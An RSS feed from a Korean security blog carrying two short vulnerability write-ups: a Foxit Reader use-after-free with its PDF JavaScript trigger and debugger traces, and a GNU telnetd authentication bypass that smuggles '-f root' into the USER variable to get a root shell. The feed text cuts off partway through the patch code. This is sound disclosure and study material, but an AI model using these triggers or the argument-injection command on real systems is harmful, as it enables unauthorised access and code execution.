<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 28 Jan 2026 14:27:31 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-58085: Foxit Reader Barcode Calculate CPDF_FormField UAF 취약점</title>
      <link>https://hackyboiz.github.io/2026/01/28/ogu123/cve-2025-58085/</link>
      <guid>https://hackyboiz.github.io/2026/01/28/ogu123/cve-2025-58085/</guid>
      <pubDate>Wed, 28 Jan 2026 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2277">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2277</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Foxit Reader &lt; 2025.2.1 or 14.0.1/13.2.1+</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Foxit Reader&#xC5D0;&#xC11C; Barcode &#xAC1D;&#xCCB4;(CPDF_FormField)&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC544;&#xB798; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; PDF &#xBB38;&#xC11C;&#xB97C; &#xD1B5;&#xD574; UAF&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xCC38;&#xACE0;&#xB85C; Foxit Reader&#xB294; Google&#xC758; V8 JavaScript &#xC5D4;&#xC9C4;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{     getField(<span class="hljs-string">&quot;Barcode Field0&quot;</span>).setAction(<span class="hljs-string">&quot;Calculate&quot;</span>,<span class="hljs-string">&apos;delete_page();&apos;</span>);     app.activeDocs[<span class="hljs-number">0</span>].addField(<span class="hljs-string">&apos;aaaa&apos;</span>, <span class="hljs-string">&quot;radiobutton&quot;</span>, <span class="hljs-number">1</span>, [<span class="hljs-number">18</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">20</span>] ) ;     app.activeDocs[<span class="hljs-number">0</span>].getField(<span class="hljs-string">&apos;aaaa&apos;</span>).checkThisBox(<span class="hljs-number">0</span>,<span class="hljs-literal">true</span>);  }<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete_page</span>(<span class="hljs-params"></span>) </span>{     event.value = <span class="hljs-string">&apos;b&apos;</span>;     app.activeDocs[<span class="hljs-number">0</span>].deletePages();}</code></pre><p><code>main</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>Barcode Field0</code>&#xC758; <code>Calculate</code> &#xC774;&#xBCA4;&#xD2B8; &#xCF5C;&#xBC31; &#xD568;&#xC218;(<code>delete_page</code>)&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; <code>checkThisBox</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74;&#xC11C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>UpdateFormField</code> &#xC2E4;&#xD589;&#xB418;&#xC5B4; <code>Calculate</code> &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, <code>Barcode Field0</code> &#xAC1D;&#xCCB4;(CPDF_FormField)&#xAC00; free &#xB418;&#xC9C0;&#xB9CC; <code>UpdateFormField</code>&#xC5D0;&#xC11C; <code>Barcode Field0</code> &#xAC1D;&#xCCB4;&#xB97C; &#xB2E4;&#xC2DC; &#xCC38;&#xC870;&#xD574; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337ca7</span>:<span class="hljs-number">00007f</span>f6`b79f6ec7 b948000000      mov     ecx,<span class="hljs-number">48</span>h  ;            [<span class="hljs-number">1</span>]<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cac</span>:                         [<span class="hljs-number">2</span>]<span class="hljs-number">00007f</span>f6`b79f6ecc e87f882c00      call    FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x600530</span> (<span class="hljs-number">00007f</span>f6`b7cbf750);<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cb1</span>:<span class="hljs-number">00007f</span>f6`b79f6ed1 <span class="hljs-number">488985</span>d8000000  mov     qword ptr [rbp+<span class="hljs-number">0</span>D8h],rax ss:<span class="hljs-number">00000019</span>`<span class="hljs-number">12</span>ef8b58=<span class="hljs-number">0000017</span>cfca95fb0<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; rrax=<span class="hljs-number">0000017</span>cdade0fb0 rbx=<span class="hljs-number">0000017</span>c91a39fd0 rcx=<span class="hljs-number">000000007f</span>fe0380rdx=d0d0d0d0d0d0d0d0 rsi=<span class="hljs-number">0000000000400000</span> rdi=<span class="hljs-number">0000017</span>cfca95fb0rip=<span class="hljs-number">00007f</span>f6b79f6ed1 rsp=<span class="hljs-number">0000001912</span>ef8980 rbp=<span class="hljs-number">0000001912</span>ef8a80 r8=<span class="hljs-number">0000000000000000</span>  r9=<span class="hljs-number">0000000000000000</span> r10=<span class="hljs-number">0000000000000000</span>r11=<span class="hljs-number">0000017</span>cdade0fb0 r12=<span class="hljs-number">0000017</span>cfca95fb0 r13=<span class="hljs-number">0000000000000000</span>r14=<span class="hljs-number">00007f</span>f6bccd4ce4 r15=<span class="hljs-number">0000017</span>c91a39ed0iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0033</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cb1</span>:<span class="hljs-number">00007f</span>f6`b79f6ed1 <span class="hljs-number">488985</span>d8000000  mov     qword ptr [rbp+<span class="hljs-number">0</span>D8h],rax ss:<span class="hljs-number">00000019</span>`<span class="hljs-number">12</span>ef8b58=<span class="hljs-number">0000017</span>cfca95fb0<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dd rax                                       ;           [<span class="hljs-number">3</span>]<span class="hljs-number">0000017</span>c`dade0fb0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0<span class="hljs-number">0000017</span>c`dade0fc0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0<span class="hljs-number">0000017</span>c`dade0fd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0<span class="hljs-number">0000017</span>c`dade0fe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0<span class="hljs-number">0000017</span>c`dade0ff0  c0c0c0c0 c0c0c0c0 d0d0d0d0 d0d0d0d0<span class="hljs-number">0000017</span>c`dade1000  ???????? ???????? ???????? ????????<span class="hljs-number">0000017</span>c`dade1010  ???????? ???????? ???????? ????????<span class="hljs-number">0000017</span>c`dade1020  ???????? ???????? ???????? ????????<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cb8</span>:<span class="hljs-number">00007f</span>f6`b79f6ed8 <span class="hljs-number">4</span>c8bbdd0000000  mov     r15,qword ptr [rbp+<span class="hljs-number">0</span>D0h] ss:<span class="hljs-number">00000019</span>`<span class="hljs-number">12</span>ef8b50=<span class="hljs-number">0000017</span>c91a39ed0<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cbf</span>:<span class="hljs-number">00007f</span>f6`b79f6edf <span class="hljs-number">4885</span>c0          test    rax,rax<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cc2</span>:<span class="hljs-number">00007f</span>f6`b79f6ee2 <span class="hljs-number">7413</span>            je      FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cd7</span> (<span class="hljs-number">00007f</span>f6`b79f6ef7) [br=<span class="hljs-number">0</span>]<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cc4</span>:<span class="hljs-number">00007f</span>f6`b79f6ee4 <span class="hljs-number">4</span>c8bc7          mov     r8,rdi<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cc7</span>:<span class="hljs-number">00007f</span>f6`b79f6ee7 <span class="hljs-number">498b</span>d7          mov     rdx,r15<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cca</span>:<span class="hljs-number">00007f</span>f6`b79f6eea <span class="hljs-number">488b</span>c8          mov     rcx,rax<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337ccd</span>:                       [<span class="hljs-number">4</span>]<span class="hljs-number">00007f</span>f6`b79f6eed e88e3d0100      call    FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x34ba60</span> (<span class="hljs-number">00007f</span>f6`b7a0ac80) ;FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x337cd2</span>:<span class="hljs-number">00007f</span>f6`b79f6ef2 <span class="hljs-number">4</span>c8bf0          mov     r14,rax<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dq <span class="hljs-number">0000017</span>c`dade0fb0   ;                               [<span class="hljs-number">5</span>]<span class="hljs-number">0000017</span>c`dade0fb0  <span class="hljs-number">00000905</span>`<span class="hljs-number">00000004</span> <span class="hljs-number">0000017</span>c`<span class="hljs-number">91</span>a39ed0<span class="hljs-number">0000017</span>c`dade0fc0  <span class="hljs-number">0000017</span>c`fca95fb0 <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">0000017</span>c`dade0fd0  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">0000017</span>c`dade0fe0  <span class="hljs-number">00000008</span>`<span class="hljs-number">00000000</span> c0c0c0c0`<span class="hljs-number">00000000</span><span class="hljs-number">0000017</span>c`dade0ff0  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> d0d0d0d0`d0d0d0d0<span class="hljs-number">0000017</span>c`dade1000  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade1010  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade1020  ????????`???????? ????????`????????</code></pre><p>[1]&#xC5D0;&#xC11C; <code>Barcode Field0</code> &#xAC1D;&#xCCB4;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; [2] &#xD560;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[3]&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xD604;&#xC7AC; PageHeap&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; <code>c0c0c0c0</code> &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[4] &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>CPDF_FormField</code> &#xAC1D;&#xCCB4; &#xCD08;&#xAE30;&#xD654; &#xD6C4; [5]&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4; &#xBA64;&#xBC84; &#xBCC0;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; rrax=<span class="hljs-number">0000000000000001</span> rbx=<span class="hljs-number">0000017</span>c91a39fd0 rcx=<span class="hljs-number">0000017</span>cb4260000rdx=<span class="hljs-number">0000017</span>cb4260000 rsi=<span class="hljs-number">0000017</span>cb0fa0fc0 rdi=<span class="hljs-number">0000017</span>cdade0fb0rip=<span class="hljs-number">00007f</span>f6b79f99b1 rsp=<span class="hljs-number">0000001912</span>efccc0 rbp=<span class="hljs-number">000000000000000</span>c r8=<span class="hljs-number">0000000000000000</span>  r9=<span class="hljs-number">0000000000000001</span> r10=<span class="hljs-number">00000000f</span>fffffefr11=<span class="hljs-number">0000001912</span>efcbf0 r12=<span class="hljs-number">0000001912</span>efcd98 r13=<span class="hljs-number">0000017</span>c91a39ed0r14=<span class="hljs-number">0000000000000000</span> r15=<span class="hljs-number">0000017</span>cfca95fb0iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0033</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x33a791</span>:<span class="hljs-number">00007f</span>f6`b79f99b1 <span class="hljs-number">488b</span>cf          mov     rcx,rdi   ;      <span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x33a794</span>:                    [<span class="hljs-number">6</span>]<span class="hljs-number">00007f</span>f6`b79f99b4 e8775e2c00      call    FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x600610</span> (<span class="hljs-number">00007f</span>f6`b7cbf830)  ;<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x33a799</span>:<span class="hljs-number">00007f</span>f6`b79f99b9 <span class="hljs-number">49</span>c7042400000000 mov     qword ptr [r12],<span class="hljs-number">0</span> ds:<span class="hljs-number">00000019</span>`<span class="hljs-number">12</span>efcd98=<span class="hljs-number">0000017</span>cdade0fb0<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dq <span class="hljs-number">0000017</span>cdade0fb0                         ;      <span class="hljs-number">0000017</span>c`dade0fb0  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade0fc0  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade0fd0  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade0fe0  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade0ff0  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade1000  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade1010  ????????`???????? ????????`????????<span class="hljs-number">0000017</span>c`dade1020  ????????`???????? ????????`????????<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x33a7a1</span>:<span class="hljs-number">00007f</span>f6`b79f99c1 <span class="hljs-number">41</span>c6859100000001 mov     byte ptr [r13+<span class="hljs-number">91</span>h],<span class="hljs-number">1</span> ds:<span class="hljs-number">0000017</span>c`<span class="hljs-number">91</span>a39f61=<span class="hljs-number">01</span></code></pre><p>JS &#xCF54;&#xB4DC; &#xC911; <code>deletePages()</code> &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; [6] <code>CPDF_InterForm::DeleteField</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xD574;&#xB2F9; &#xD398;&#xC774;&#xC9C0;&#xC758; &#xAC1D;&#xCCB4;&#xB4E4;&#xC744; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; free &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; gFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x351e0b</span>:       [<span class="hljs-number">7</span>]<span class="hljs-number">00007f</span>f6`b7a1102b <span class="hljs-number">8b</span>01            mov     eax,dword ptr [rcx] ds:<span class="hljs-number">0000017</span>c`dade0fb0=????????<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; uFoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x351e0b</span>:<span class="hljs-number">00007f</span>f6`b7a1102b <span class="hljs-number">8b</span>01            mov     eax,dword ptr [rcx]<span class="hljs-number">00007f</span>f6`b7a1102d <span class="hljs-number">83</span>c0fe          add     eax,<span class="hljs-number">0F</span>FFFFFFEh<span class="hljs-number">00007f</span>f6`b7a11030 <span class="hljs-number">83f</span>806          cmp     eax,<span class="hljs-number">6</span><span class="hljs-number">00007f</span>f6`b7a11033 <span class="hljs-number">0f</span>872a060000    ja      FoxitPDFReader!safe_vsnprintf+<span class="hljs-number">0x352443</span> (<span class="hljs-number">00007f</span>f6`b7a11663)<span class="hljs-number">00007f</span>f6`b7a11039 <span class="hljs-number">4898</span>            cdqe<span class="hljs-number">00007f</span>f6`b7a1103b <span class="hljs-number">488</span>d0dbeef3ffe  lea     rcx,[FoxitPDFReader (<span class="hljs-number">00007f</span>f6`b5e10000)]<span class="hljs-number">00007f</span>f6`b7a11042 <span class="hljs-number">448b</span>8c81b016c001 mov     r9d,dword ptr [rcx+rax*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>C016B0h]<span class="hljs-number">00007f</span>f6`b7a1104a <span class="hljs-number">4</span>c03c9          add     r9,rcx</code></pre><p>[7]&#xBC88;&#xC5D0;&#xC11C; <code>CPDF_FormField</code> &#xAC1D;&#xCCB4;&#xB97C; &#xB2E4;&#xC2DC; &#xCC38;&#xC870;&#xD574; UAF&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC870;&#xC5D0; &#xB530;&#xB77C; Arbitrary Read/Write&#xAC00; &#xAC00;&#xB2A5;&#xD574; RCE&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://pdfium.googlesource.com/pdfium.git/+/refs/heads/chromium/7409/fxjs/cjs_field.cpp">https://pdfium.googlesource.com/pdfium.git/+/refs/heads/chromium/7409/fxjs/cjs_field.cpp</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Foxit-Reader/">Foxit Reader</category>
      
      <category domain="https://hackyboiz.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/JS/">JS</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/28/ogu123/cve-2025-58085/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2026-24061: GNU Inetutils의 telnetd에서 발생 원격 인증 우회 취약점</title>
      <link>https://hackyboiz.github.io/2026/01/24/bekim/2026-01-24/</link>
      <guid>https://hackyboiz.github.io/2026/01/24/bekim/2026-01-24/</guid>
      <pubDate>Sat, 24 Jan 2026 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ubuntu.com/security/CVE-2026-24061&quot;&gt;https:/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://ubuntu.com/security/CVE-2026-24061">https://ubuntu.com/security/CVE-2026-24061</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24061">https://nvd.nist.gov/vuln/detail/CVE-2026-24061</a></li></ul><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><ul><li>1.9.3 &#x2264; GNU Inetutils telnetd &#x2264; 2.7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; GNU Inetutils &#xD328;&#xD0A4;&#xC9C0;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; Telnetd(Telnet &#xC11C;&#xBC84; &#xB370;&#xBAAC;)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xC6D0;&#xACA9; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, telnetd&#xAC00; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD658;&#xACBD;&#xBCC0;&#xC218; USER&#xB97C; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xB85C;&#xADF8;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>telnetd&#xB294; &#xC6D0;&#xACA9; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; Telnet&#xC73C;&#xB85C; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; /bin/login&#xC744; &#xC2E4;&#xD589;&#xD574;, &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xC740; &#xD658;&#xACBD; &#xBCC0;&#xC218; USER &#xAC12;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294;&#xB370;, &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>login -p &lt;username&gt;</code></pre><p>&#xBB38;&#xC81C;&#xB294; telnetd&#xAC00; <code>USER</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC758; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xC73C;&#xB85C;&#xB9CC; &#xAC00;&#xC815;&#xD558;&#xACE0;, &#xD574;&#xB2F9; &#xAC12;&#xC774; login &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC635;&#xC158;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xB420; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC804;&#xD600; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">//before patch</span><span class="hljs-keyword">case</span> <span class="hljs-string">&apos;U&apos;</span>:  <span class="hljs-keyword">return</span> getenv (<span class="hljs-string">&quot;USER&quot;</span>) ? xstrdup (getenv (<span class="hljs-string">&quot;USER&quot;</span>)) : xstrdup (<span class="hljs-string">&quot;&quot;</span>);</code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xB294; Telnet &#xC5F0;&#xACB0; &#xC2DC; <code>USER</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC5D0; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984; &#xB300;&#xC2E0;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC12;&#xC744; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-attr">USER</span>=<span class="hljs-string">&quot;-f root&quot;</span></code></pre><p><code>f</code> &#xC635;&#xC158;&#xC740; <code>/bin/login</code>&#xC5D0;&#xC11C; <strong>&#xC774;&#xBBF8; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xACE0; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xAC80;&#xC99D;&#xC744; &#xC0DD;&#xB7B5;</strong>&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xC635;&#xC158;&#xC778;&#xB370;, &#xD574;&#xB2F9; &#xAC12;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xBA74; telnetd&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB85C;&#xADF8;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>login -p -f root</code></pre><p>&#xC774;&#xCC98;&#xB7FC; root &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC778;&#xC99D; &#xC808;&#xCC28; &#xC5C6;&#xC774; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xC5EC; root &#xAD8C;&#xD55C; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><pre><code class="hljs powershell">sudo apt<span class="hljs-literal">-get</span> install inetutils<span class="hljs-literal">-telnetd</span> telnetsudo sed <span class="hljs-literal">-i</span> <span class="hljs-string">&apos;s/#&lt;off&gt;# telnet/telnet/&apos;</span> /etc/inetd.confsudo /etc/init.d/inetutils<span class="hljs-literal">-inetd</span> <span class="hljs-built_in">start</span>USER=<span class="hljs-string">&apos;-f root&apos;</span> telnet <span class="hljs-literal">-a</span> localhost</code></pre><pre><code class="hljs powershell">root@hostname:~<span class="hljs-comment">#</span></code></pre><h3 id="Fetch"><a href="#Fetch" class="headerlink" title="Fetch"></a>Fetch</h3><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; GNU Inetutils 2.8 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC635;&#xC158;&#xC774;&#xB098; &#xC258; &#xBA54;&#xD0C0; &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB420; &#xACBD;&#xC6B0; &#xBB34;&#xC2DC;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">case</span> <span class="hljs-string">&apos;U&apos;</span>:{    <span class="hljs-comment">/* Ignore user names starting with &apos;-&apos; or containing shell</span><span class="hljs-comment">       metachars, as they can cause trouble. */</span>    <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *u = getenv(<span class="hljs-string">&quot;USER&quot;</span>);    <span class="hljs-keyword">return</span> xstrdup(        (u &amp;&amp; *u != <span class="hljs-string">&apos;-&apos;</span>      